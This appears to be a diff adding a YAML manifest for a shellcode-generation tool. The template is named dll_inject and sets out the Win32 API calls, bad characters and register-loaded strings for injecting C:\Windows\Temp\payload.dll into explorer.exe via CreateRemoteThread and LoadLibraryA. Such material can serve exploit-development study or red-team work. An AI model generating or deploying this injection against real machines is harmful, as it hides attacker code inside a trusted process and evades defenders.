@@ -1,0 +1,49 @@
+template: dll_inject
+# Inject a DLL into a running process via CreateRemoteThread + LoadLibraryA.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/dll_inject.yaml \
+#       --process-name "explorer.exe" \
+#       --dst "C:\\Windows\\Temp\\payload.dll" \
+#       --out emitter_out/
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - CreateToolhelp32Snapshot
+  - Process32First
+  - Process32Next
+  - OpenProcess
+  - VirtualAllocEx
+  - WriteProcessMemory
+  - GetModuleHandleA
+  - GetProcAddress
+  - CreateRemoteThread
+  - CloseHandle
+  - ExitProcess
+
+variables:
+  - snapshot_handle
+  - target_pid
+  - proc_handle
+  - remote_buf
+  - thread_handle
+
+strings:
+  - label: process_name
+    value: "explorer.exe"
+    method: mov
+    dest: edi
+  - label: dll_path
+    value: "C:\\Windows\\Temp\\payload.dll"
+    method: mov
+    dest: edi
+  - label: kernel32_str
+    value: "kernel32.dll"
+    method: push
+  - label: loadlib_str
+    value: "LoadLibraryA"
+    method: mov
+    dest: edi
+
+structs:
+  - PROCESSENTRY32
